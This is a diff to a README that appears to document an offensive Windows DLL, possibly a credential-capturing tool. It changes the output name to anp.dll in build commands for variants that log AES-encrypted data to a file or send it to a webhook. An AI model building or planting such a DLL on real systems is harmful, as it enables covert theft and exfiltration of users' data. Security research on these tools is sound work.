@@ -40,7 +40,7 @@ Which decoded is:
 The default path is "C:\Windows\Task\default.txt" and the default AES password is "TEST1234", but you can customize it using the macros /DFILE_PATH and /DAES_PWD:
 
 ```
-cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" /DAES_PWD=\"TEST1234\" 2_textfile_aes.c crypt32.lib advapi32.lib /link /OUT:test.dll
+cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" /DAES_PWD=\"TEST1234\" 2_textfile_aes.c crypt32.lib advapi32.lib /link /OUT:anp.dll
 ```
 
 This creates a file with a content similar to:
@@ -71,7 +71,7 @@ And you get:
 There is not a default webhook url, you have to set the value using the macro /DWEBHOOK_URL:
 
 ```
-cl /LD /DWEBHOOK_URL=L\"https://...\" 3_webhook_base64.c crypt32.lib wininet.lib /link /OUT:test.dll
+cl /LD /DWEBHOOK_URL=L\"https://...\" 3_webhook_base64.c crypt32.lib wininet.lib /link /OUT:anp.dll
 ```
 
 <br>
@@ -81,7 +81,7 @@ cl /LD /DWEBHOOK_URL=L\"https://...\" 3_webhook_base64.c crypt32.lib wininet.lib
 You have to set the webhook url value using the macro /DWEBHOOK_URL, the default AES password is "TEST1234" but you can customize it using /DAES_PWD:
 
 ```
-cl /LD /DWEBHOOK_URL=L\"https://...\" 4_webhook_aes.c crypt32.lib wininet.lib advapi32.lib /link /OUT:test.dll
+cl /LD /DWEBHOOK_URL=L\"https://...\" /DAES_PWD=\"TEST1234\" 4_webhook_aes.c crypt32.lib wininet.lib advapi32.lib /link /OUT:anp.dll
 ```
 
 <br>
